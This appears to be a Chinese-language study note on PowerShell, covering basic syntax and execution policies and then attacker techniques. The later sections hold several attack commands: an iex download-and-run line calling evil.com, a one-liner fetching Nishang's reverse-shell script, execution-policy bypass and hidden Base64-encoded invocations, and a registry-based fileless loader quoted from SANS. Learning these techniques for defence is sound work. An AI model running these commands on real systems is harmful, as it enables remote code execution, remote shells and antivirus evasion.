## 🔍 PowerShell 是什麼？

- PowerShell 是基於 .NET Framework 的命令列 shell 與腳本語言。
    
- 用於系統管理與自動化，但也常被攻擊者當作滲透利器。
    
- Windows 7 SP1 起預設安裝，廣泛存在於各種 Windows 作業系統中。
    

---

## 💡 介面類型

1. **CLI**：`powershell.exe`
    
2. **GUI**：`PowerShell_ISE.exe`（整合式腳本環境）

---
## 📜 PowerShell 基礎語法回顧

### ▪ Cmdlet 命名格式

- 標準格式為：`動詞-名詞`（Verb-Noun）
    
    - 例：`Get-Service`, `Start-Process`
        

### ▪ 常見參數

- `-WhatIf`：模擬執行但不實際執行
    
- `-Force`：強制執行操作
    
- `-ComputerName`：遠端操作
    
- `-Identity`：指定目標對象
    

### ▪ 查詢說明

- `Get-Help <Cmdlet>`（加上 `-Full` 或 `-Examples` 查看完整用法）
    

---
## 🛠️ 攻擊者常見用途

### 1. 在記憶體中執行（Memory-only）

- 利用 `Invoke-Expression`（`iex`）直接執行 payload，不落地檔案，**避開防毒偵測**。

### 2. 遠端下載與執行

- 範例：
    
```
iex (New-Object Net.WebClient).DownloadString("http://evil.com/payload.ps1")
```
    

### 3. 呼叫 Windows API & .NET Code

- 如匯入 `System.Management.Automation.dll` 來建立複雜功能。

---
## 🚫 執行政策與繞過方法

### PowerShell 執行政策（Execution Policy）

|模式|說明|
|---|---|
|`Restricted`（預設）|禁止所有腳本執行|
|`AllSigned`|僅允許簽章過的腳本|
|`RemoteSigned`|本機腳本允許，遠端腳本需簽章|
|`Unrestricted`|允許執行所有腳本，彈出警告|
|`Bypass`|無限制、無提示|

### 修改方式：

`Set-ExecutionPolicy Unrestricted`

### 一次性繞過（不需改變全局設定）：

`powershell.exe -ExecutionPolicy Bypass -File script.ps1`

---

## 🎭 混淆與反偵測技巧

### ▪ Base64 編碼執行（EncodedCommand）

- 攻擊者將 payload 編碼成 Base64 並傳入 `EncodedCommand`
    
- 範例：
    
    `powershell.exe -WindowStyle Hidden -NoProfile -EncodedCommand <Base64Payload>`
    

### ▪ 常見參數組合

`powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -EncodedCommand ...`

---
## 💥 進階攻擊範例

### ▪ 使用 `iex` 建立 Reverse Shell

#### 📡 HTTP：

```
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1')
```

#### 📡 TCP、ICMP、UDP、HTTPS

Nishang 提供多種 Shell 模組：

- `Invoke-PowerShellTcp`
- `Invoke-PowerShellUdp`
- `Invoke-PowerShellIcmp`
- `Invoke-PoshRatHttps`

Nishang GitHub： 👉 [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

---

## 🧬 Fileless PowerShell 攻擊

### Registry-based 載入攻擊

將 base64 編碼的惡意腳本寫入 Registry，再以 PowerShell 解碼執行：

```
powershell.exe -windowstyle hidden -noprofile -executionpolicy bypass iex( 
	[Text.Encoding]::ASCII.GetString(
		[Convert]::FromBase64String(
			(gp 'HKCU:\Software\Classes\UBZZXDJZAOGD').XLQWFZRMYEZV
		)   
	) 
)
```

- 範例來源：[https://isc.sans.edu/diary/Powershell+Malware+No+Hard+drive+Just+hard+times/20823](https://isc.sans.edu/diary/Powershell+Malware+No+Hard+drive+Just+hard+times/20823)